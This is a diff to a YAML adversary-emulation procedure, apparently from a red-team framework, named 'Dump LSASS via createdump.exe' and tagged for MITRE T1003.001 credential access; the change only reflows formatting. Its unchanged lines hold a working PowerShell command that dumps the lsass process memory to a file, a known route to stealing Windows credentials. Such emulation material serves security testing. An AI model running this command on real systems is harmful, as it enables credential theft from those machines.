@@ -1,6 +1,7 @@
 id: 3d1a91c9-e1a8-4d40-aaf3-05594e7be41a
 name: Dump LSASS via createdump.exe
-description: This procedure uses createdump.exe found in .NET5 to create a dump file of lsass.
+description: This procedure uses createdump.exe found in .NET5 to create a dump file
+  of lsass.
 tactic: credential-access
 technique:
   id: T1003.001
@@ -12,6 +13,6 @@ platforms:
         Invoke-Command -ScriptBlock {C:\Program` Files\dotnet\shared\Microsoft.NETCore.App\5.0.3\createdump.exe -u -f lsass.dmp (Get-Process lsass).id}
 metadata:
   authors:
-    - bfuzzy1
-    - '@bopin2020'
+  - bfuzzy1
+  - '@bopin2020'
   tags: []
